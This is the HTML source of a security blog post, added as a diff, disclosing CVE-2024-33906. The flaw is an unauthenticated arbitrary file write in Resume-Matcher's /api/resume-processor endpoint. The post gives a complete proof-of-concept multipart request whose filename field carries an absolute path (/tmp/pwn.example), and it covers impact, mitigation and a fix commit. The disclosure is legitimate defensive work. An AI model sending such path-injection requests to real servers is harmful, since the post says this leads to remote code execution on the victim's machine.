@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="Security research blog">
+    <meta property="og:type" content="website">
+    <meta name="description" content="Security research blog">
+    <meta name="keyword"  content="security,research,vulnerability,blog,vulnerabilites">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <title>
+        
+        Arbitrary File Write in Resume-Matcher - YNizry
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    <style>
+    .googleicon {
+        vertical-align: middle;
+        font-size: 20px;
+        font-style: normal;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;    
+        color: #999999;
+        }
+    </style>
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+
+    
+  
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-SCK9223GY8"></script>
+    <script>
+      window.dataLayer = window.dataLayer || []
+      function gtag() {
+        dataLayer.push(arguments)
+      }
+      gtag('js', new Date())
+      gtag('config', 'G-SCK9223GY8')
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Yaniv Nizry Blogs" type="application/atom+xml">
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.webp" />
+        </div>
+        <div class="name">
+            <i>Yaniv Nizry</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="material-icons googleicon">home</i>
+                    <span>Blogs</span>
+                </a>
+            </li>
+            <li >
+                <a href="/advisories">
+                    <i class="material-icons googleicon">speaker_notes</i>
+                    <span>Advisories</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="material-icons googleicon">label</i>
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archive">
+                    <i class="material-icons googleicon">archive</i>
+                    <span>Archives</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="material-icons googleicon">person</i>
+                    <span>About</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="material-icons googleicon">search</i>
+                    <span>Search</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Description"><span class="toc-text">Description</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Explotation"><span class="toc-text">Explotation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Impact"><span class="toc-text">Impact</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mitigation"><span class="toc-text">Mitigation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#References"><span class="toc-text">References</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        <div class="post-container">
+    <div class="post-title">
+        Arbitrary File Write in Resume-Matcher    
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2024-04-28 22:00:00</span></span>
+        
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#arbitrary file write" title="arbitrary file write">arbitrary file write</a>
+        <span>/</span>
+        
+        </span>
+        
+        
+
+        
+            <span class="attr">/
+            
+                <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2024-33906" title="CVE-2024-33906">CVE-2024-33906</a>
+                    <span>/</span>
+            
+            
+            </span>
+        
+
+
+        
+        <!--<span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>-->
+    </span>
+    </span>
+    </div>
+
+    <div class="post-source-meta post-meta">
+        
+    </div>
+    <div class="post-content no-indent">
+        <h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Resume-Matcher through 0.1.1-alpha is susceptible to arbitrary file write due to improper file path validation in the <code>/api/resume-processor</code> endpoint. An attacker could upload a malicious file to an arbitrary location on the server, which results in remote code execution in most system configurations.</p>
+<h1 id="Explotation"><a href="#Explotation" class="headerlink" title="Explotation"></a>Explotation</h1><ol>
+<li>The following request will create a <code>/tmp/pwn.example</code> file.</li>
+</ol>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/resume-processor</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8000</span><br><span class="line"></span><br><span class="line"><span class="language-fortran">Content-Length: <span class="number">335</span></span></span><br><span class="line"><span class="language-fortran">Content-<span class="keyword">Type</span>: multipart/<span class="keyword">form</span>-<span class="keyword">data</span>;</span></span><br><span class="line"><span class="language-fortran">boundary=----WebKitFormBoundaryB7BMKT4iboAIYDLB</span></span><br><span class="line"><span class="language-fortran"></span></span><br><span class="line"><span class="language-fortran">------WebKitFormBoundaryB7BMKT4iboAIYDLB</span></span><br><span class="line"><span class="language-fortran">Content-Disposition: <span class="keyword">form</span>-<span class="keyword">data</span>; <span class="keyword">name</span>=<span class="string">&quot;resume&quot;</span>; filename=<span class="string">&quot;/tmp/pwn.example&quot;</span></span></span><br><span class="line"><span class="language-fortran">Content-<span class="keyword">Type</span>: application/pdf</span></span><br><span class="line"><span class="language-fortran"><span class="keyword">file</span>-<span class="keyword">data</span></span></span><br><span class="line"><span class="language-fortran"></span></span><br><span class="line"><span class="language-fortran">------WebKitFormBoundaryB7BMKT4iboAIYDLB</span></span><br><span class="line"><span class="language-fortran">Content-Disposition: <span class="keyword">form</span>-<span class="keyword">data</span>; <span class="keyword">name</span>=<span class="string">&quot;jobs&quot;</span></span></span><br><span class="line"><span class="language-fortran">Content-<span class="keyword">Type</span>: application/json</span></span><br><span class="line"><span class="language-fortran">&#123;&#125;</span></span><br><span class="line"><span class="language-fortran"></span></span><br><span class="line"><span class="language-fortran">------WebKitFormBoundaryB7BMKT4iboAIYDLB--</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h1><p>Unauthenticated attacker can upload arbitrary files into the server which results in remote code execution in most system configurations.</p>
+<h1 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h1><p>Upgrade Resume-Matcher to the latest version.</p>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/srbhr/Resume-Matcher/commit/f2c28b4b4bff4070582fdd1c87563e4a68601a69">Commit</a></li>
+</ul>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        <li>
+            <a target="_blank" href="https://twitter.com/YNizry">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-twitter"></i>
+                            </span>
+            </a>
+        </li>
+        
+        
+
+        
+
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://github.com/yaniv-git">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-github"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://www.linkedin.com/in/yaniv-n-8b4a76193">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-linkedin"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+    </ul>
+    
+    <p>
+    Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
